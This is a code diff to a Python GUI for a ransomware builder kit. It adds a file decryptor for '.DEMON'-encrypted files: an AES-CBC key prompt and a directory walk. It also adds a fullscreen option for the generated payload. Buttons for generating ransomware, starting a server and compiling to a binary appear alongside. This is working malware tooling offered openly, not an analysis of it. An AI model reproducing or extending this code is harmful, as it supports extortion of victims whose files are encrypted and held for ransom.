@@ -7,10 +7,53 @@ from tkinter import messagebox
 from pymsgbox import *
 from io import BytesIO
 
+try:
+    from Crypto import Random
+    from Crypto.Cipher import AES
+    from tkinter.filedialog import askdirectory
+    from pymsgbox import *
+except ImportError as e:
+    print('ERROR - Failed to import some modules.\n\n%s' % e)
+    pass
+
 def resource_path(relative_path):
     if hasattr(sys, '_MEIPASS'):
         return os.path.join(sys._MEIPASS, relative_path)
     return os.path.join(os.path.abspath("."), relative_path)
+
+def dec_key():
+    key = password(text='Please enter your decryption key', title='Enter Key', mask ='*')
+    if key == None or key == '':
+        messagebox.showwarning('Error', 'Please, enter your key.')
+        return dec_key()
+    elif not len(key) == 32:
+        messagebox.showwarning('Invalid Key', 'Key should be 32 characters long')
+        return dec_key()
+    return key
+
+def dec_path():
+    path = askdirectory(title = 'Select directory with files to decrypt')
+    if path == None or path == '':
+        messagebox.showwarning('Error', 'No path selected, exiting...')
+        sys.exit(1)
+    path =  path + '/'
+    return path
+
+def pad(s):
+    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
+
+def decrypt(ciphertext, key):
+    iv = ciphertext[:AES.block_size]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
+    return plaintext.rstrip(b"\0")
+
+def decrypt_file(file_name, key):
+    with open(file_name, 'rb') as f:
+        ciphertext = f.read()
+    dec = decrypt(ciphertext, key)
+    with open(file_name[:-6], 'wb') as f:
+        f.write(dec)
 
 class MainWindow(Tk):
     def __init__(self):
@@ -72,7 +115,7 @@ class MainWindow(Tk):
         start_server = Button(self, text = "START SERVER", command = self.open_server, width = 53).grid(row = 4, column = 0, columnspan = 6)
         generate_demon = Button(self, text = "GENERATE RANSOMWARE", command = self.generate, width = 53).grid(row = 5, column = 0, columnspan = 6)
         compile = Button(self, text = "COMPILE TO BINARY", command = self.compile, width = 53).grid(row = 6, column = 0, columnspan = 6)
-        decrypt = Button(self, text = "DECRYPT FILES", command = self.exit, width = 53).grid(row = 7, column = 0, columnspan = 6)
+        decrypt = Button(self, text = "DECRYPT FILES", command = self.decrypt_files, width = 53).grid(row = 7, column = 0, columnspan = 6)
         exit = Button(self, text = "EXIT", command = self.exit, width = 53).grid(row = 8, column = 0, columnspan = 6)
 
     def open_server(self):
@@ -204,11 +247,14 @@ class MainWindow(Tk):
 
         host = '0.0.0.0'
         port = 8989
+        full_screen = IntVar()
+
 
         mode_frame = LabelFrame(self.gen, text = 'Mode')
         mode_frame.grid(row = 0, column = 0)
-        term = Radiobutton(mode_frame, text = 'Console', variable = self.options['mode'], value = 'term').grid(row = 0, column = 0, sticky = 'w')
-        gui = Radiobutton(mode_frame, text = 'GUI', variable = self.options['mode'], value = 'gui').grid(row = 1, column = 0, sticky = 'w')
+        gui = Radiobutton(mode_frame, text = 'GUI', variable = self.options['mode'], value = 'gui').grid(row = 0, column = 0, sticky = 'w')
+        term = Radiobutton(mode_frame, text = 'Console', variable = self.options['mode'], value = 'term').grid(row = 1, column = 0, sticky = 'w')
+        full = Checkbutton(mode_frame, text = "Fullscreen mode", variable = full_screen, onvalue = 1, offvalue = 0).grid(row = 0, column = 1, sticky = 'w')
 
         server_frame = LabelFrame(self.gen, text = 'Remote Server')
         server_frame.grid(row = 0, column = 1)
@@ -224,7 +270,29 @@ class MainWindow(Tk):
         finish_frame.grid(row = 1, column = 0, columnspan = 2)
         generate = Button(finish_frame, text = "GENERATE", command = self.gen.destroy, width = 20).grid(row = 0, column = 0)
 
+    def decrypt_files(self):
+        key = dec_key()
+        p = dec_path()
 
+        try:
+            counter = 0
+            for path, subdirs, files in os.walk(p):
+                for name in files:
+                    if name.endswith(".DEMON"):
+                        decrypt_file(os.path.join(path, name), key)
+                        print("[Decrypting] %s" % name)
+                        counter+=1
+                        os.remove(os.path.join(path, name))
+                    else:
+                        print("[Skipped] %s" % name)
+            print("\n[DONE] Decrypted %i files" % counter)
+
+        except KeyboardInterrupt:
+            print("\nInterrupted!\n")
+            sys.exit(0)
+        except Exception as e:
+            print("\n[ ERROR ] %s" % e)
+            sys.exit(1)
 
     def start_thread(self):
         # Start server as thread
